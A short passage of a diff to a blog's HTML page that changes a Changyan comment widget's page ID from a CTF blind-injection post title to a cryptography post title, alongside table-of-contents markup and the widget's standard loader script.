href="#%E5%86%99%E5%9C%A8%E6%9C%80%E5%90%8E%EF%BC%9ALast"><span class="toc-number">7.</span> <span class="toc-text">写在最后：Last</span></a></li></ol>
                     </div>
                 </span>
             </div>
@@ -379,7 +426,7 @@
   
 
   
-  <div id="SOHUCS" sid="ctfweb-各种盲注脚本" ></div> 
+  <div id="SOHUCS" sid="CRYPTO——密码的取经之路" ></div> 
 <script charset="utf-8" type="text/javascript" src="//changyan.sohu.com/upload/changyan.js" ></script>
 <script type="text/javascript">
     window.changyan.api.config({
